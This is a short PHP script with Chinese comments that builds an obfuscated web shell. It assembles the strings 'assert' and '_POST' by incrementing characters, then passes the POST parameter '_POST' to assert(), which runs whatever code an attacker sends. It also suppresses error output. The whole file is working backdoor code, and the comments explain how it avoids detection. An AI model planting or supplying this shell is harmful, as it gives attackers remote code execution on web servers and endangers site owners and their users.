<?php
error_reporting(0);//去除错误回显
class Foo  //创建名为FOO的类
{
    function Variable($c)
    {
        $name = 'Bar';
        $b=$this->$name(); // 调用Bar
        $b($c);
    }
    function Bar()
    {
    	$__='a';
        $a1=$__; //$a1=a;
		$__++;$__++;$__++;$__++;//$a__=e;
		$a2=$__; //$a2=e;
		$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//$__=r;
		$a3=$__++; //$a3=r;$__=s;
		$a4=$__++; //$a4=s;$__=t;
		$a5=$__;   //$a5=$__=t;
		$a=$a1.$a4.$a4.$a2.$a3.$a5; //$a=assert
        return $a; //将$a的值返回
    }
}
function variable(){
	$_='A';
	$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; //$_=O;
	$b1=$_++; //$b1=O;$_=P;
	$b2=$_;   //$b2=$_=P
	$_++;$_++;$_++; //$_=S
	$b3=$_++; //$b3=S;$_=T;
	$b4=$_; //$b4=$_=T;
	$b='_'.$b2.$b1.$b3.$b4;//$b=_POST
	return $b; //将$b的值返回
}
$foo = new Foo(); //创建名为foo对象
$funcname = "Variable"; //将Variable的值赋给变量funcname
$bb=${variable()}[variable()]; // $bb=_POST[_POST]);
$foo->$funcname($bb); //调用 $foo->Variable($bb)
?>